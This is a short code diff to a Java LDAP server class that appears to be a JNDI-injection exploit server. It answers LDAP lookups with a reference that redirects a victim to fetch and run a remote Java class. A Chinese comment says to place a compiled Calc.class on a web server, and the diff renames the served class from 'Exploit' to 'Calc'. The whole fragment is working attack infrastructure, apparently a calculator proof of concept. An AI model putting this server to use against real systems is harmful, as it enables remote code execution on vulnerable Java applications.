@@ -32,7 +32,7 @@ public class LdapServer {
   public static void run() {
     int port = 43658;
     //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
-    String url = "http://localhost:80#Calc";
+    String url = "http://localhost/#Calc";
     try {
       InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
       config.setListenerConfigs(new InMemoryListenerConfig(
@@ -86,9 +86,9 @@ public class LdapServer {
 
     protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
         throws LDAPException, MalformedURLException {
-      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
+      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(""));
       System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
-      e.addAttribute("javaClassName", "Exploit");
+      e.addAttribute("javaClassName", "Calc");
       String cbstring = this.codebase.toString();
       int refPos = cbstring.indexOf('#');
       if (refPos > 0) {
